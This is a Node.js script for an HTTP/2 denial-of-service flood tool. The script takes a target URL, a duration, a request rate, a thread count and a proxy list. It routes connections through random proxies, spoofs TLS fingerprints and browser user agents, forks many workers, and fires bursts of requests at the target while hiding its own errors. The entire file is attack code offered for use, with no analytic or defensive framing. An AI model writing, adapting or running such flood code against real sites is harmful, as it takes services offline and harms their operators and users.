const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
var colors = require("colors");

function randstr(length) {
   const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

const accept_header = [
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 6) {
  console.log('node flood target time rate thread proxy'.rainbow);
  process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function getRandomValue(array) {
    return array[Math.floor(Math.random() * array.length)];
}

const operatingSystems = [
    "Windows NT 10.0; Win64; x64",
    "Macintosh; Intel Mac OS X 10_15_7",
    "X11; Linux x86_64",
    "Android 10; Mobile",
    "iPhone; CPU iPhone OS 14_2 like Mac OS X"
];

const architectures = {
    "Windows NT 10.0; Win64; x64": "WOW64",
    "Macintosh; Intel Mac OS X 10_15_7": "x86_64",
    "X11; Linux x86_64": "x86_64",
    "Android 10; Mobile": "armv7l",
    "iPhone; CPU iPhone OS 14_2 like Mac OS X": "arm64"
};

const browsers = [
    "Chrome/91.0.4472.124",
    "Safari/537.36",
    "Firefox/89.0",
    "Edge/91.0.864.54",
    "Opera/77.0.4054.172"
];

const skid = [
    "10005465237",
    "8851064634",
    "89313646253",
    "2206423942",
    "12635495631"
];

const lol = skid[Math.floor(Math.random() * skid.length)];
const randomOS = getRandomValue(operatingSystems);
const randomArch = architectures[randomOS];
const randomBrowser = getRandomValue(browsers);
const uap = `Mozilla/5.0 (${randomOS}; ${lol}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}`;

const sigalgs = [
       'ecdsa_secp256r1_sha256',
       'ecdsa_secp384r1_sha384',
       'ecdsa_secp521r1_sha512',
       'rsa_pss_rsae_sha256',
       'rsa_pss_rsae_sha384',
       'rsa_pss_rsae_sha512',
       'rsa_pkcs1_sha256',
       'rsa_pkcs1_sha384',
       'rsa_pkcs1_sha512',
];

let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.SSL_OP_NO_TLSv1_3 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const rateHeaders = [
   { "Vary" : "RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url, Accept-Encoding"},
   { "Attribution-Reporting-Eligible" : "trigger"},
];

const rateHeaders2 = [
   { "TTL-3": "1.5" },
];

const rateHeaders3 = [
   { "A-IM": "Feed" },
];


const dynHeaders = {
   ...headers,
   ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
   ...rateHeaders2[Math.floor(Math.random()*rateHeaders.length)],
   ...rateHeaders3[Math.floor(Math.random()*rateHeaders.length)]
};

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
colors.enable();
const coloredString = "Recommended big proxyfile if hard target".white;

if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
       console.clear();
       console.log('Target: '+process.argv[2]);
       console.log('Time: '+process.argv[3]);
       console.log('Rate: '+process.argv[4]);
       console.log('Thread(s): '+process.argv[5]);
       console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);
       console.log("Note: ".brightCyan + coloredString);
       cluster.fork();
   }
} else {
   for (let i = 0; i < 10; i++) {
       setInterval(runFlooder, 1);
   }
}

class NetSocket {
    constructor(){}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);
        connection.on("connect", () => {
           connection.write(buffer);
        });

        connection.on("data", chunk => {
           const response = chunk.toString("utf-8");
           const isAlive = response.includes("HTTP/1.1 200");
           if (isAlive === false) {
               connection.destroy();
               return callback(undefined, "error: invalid response from proxy server");
           }
           return callback(connection, undefined);
        });

        connection.on("timeout", () => {
           connection.destroy();
           return callback(undefined, "error: timeout exceeded");
        });
    }
}

function cookieString(cookie) {
   var s = "";
   for (var c in cookie) {
     s = `${s} ${cookie[c].name}=${cookie[c].value};`;
   }
   s = s.substring(1);
   return s.substring(0, s.length - 1);
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"

    let userAgent = randomUseragent.getRandom(function (ua) {
       return ua.browserName === 'Firefox';
    });

    let headers = {
        ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
        ":method": "GET",
        "Accept" : accept_header[Math.floor(Math.random() * accept_header.length)],
        ":path": Math.random() < 1 / 100000 ? parsedTarget.path + "?search=" + generateRandomString(2, 3) + "&&lr" + generateRandomString(2, 3) : parsedTarget.path + "?search=HTTP-DDOS#" + generateRandomString(2, 3) + "&lr=" + generateRandomString(2, 3),
        ":scheme": "https",
        "user-agent": uap,
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true)

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        const tlsOptions = {
            port: parsedPort,
            secure: true,
            ALPNProtocols: [
                "h2","http/1.1"
            ],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            followAllRedirects: true,
            challengeToSolve: 45,
            clientTimeout: 20000,
            clientlareMaxTimeout: 5000,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "DYNAMIC",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 100000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            maxFrameSize : 40000,
            enablePush: false
        });

        client.setMaxListeners(0);
        client.settings(settings);

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return;
                    });
                    request.end();
                }
            }, 550); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
    });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

